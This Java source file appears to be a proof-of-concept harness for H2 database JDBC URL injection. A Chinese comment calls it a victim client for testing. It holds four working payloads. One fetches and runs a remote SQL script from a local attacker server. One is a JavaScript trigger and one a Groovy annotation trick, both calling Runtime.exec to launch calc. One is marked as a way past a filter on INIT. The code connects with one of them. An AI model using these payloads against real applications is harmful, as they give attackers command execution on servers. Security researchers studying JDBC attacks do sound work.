package org.exploit.JDBC;

import java.sql.Connection;
import java.sql.DriverManager;

//用于测试的受害JDBC Client,需要JDK11，因为H2就要JDK11
public class H2database_JDBC_Client {
    public static void main(String[] args) throws Exception {
        String ClassName = "org.h2.Driver";
        String JDBC_Url1 = "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/h2_JDBC_Attack.sql'";
        String JDBC_Url2 = "jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS '//javascript\n" +
                "Java.type(\"java.lang.Runtime\").getRuntime().exec(\"calc\")'";
        String JDBC_Url3 = "jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS\n" +
                "$$@groovy.transform.ASTTest(value={\n" +
                "assert java.lang.Runtime.getRuntime().exec(\"cmd.exe /c calc.exe\")\n" +
                "})\n" +
                "def x$$";//payload3需要groovy依赖
        String JDBC_Url4 = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "Java.type(\"java.lang.Runtime\").getRuntime().exec(\"calc\")$$--";//INIT被过滤绕过
        String username = "root";
        String password = "root";
        Class.forName(ClassName);
        Connection connection = DriverManager.getConnection(JDBC_Url3, username, password);
    }
}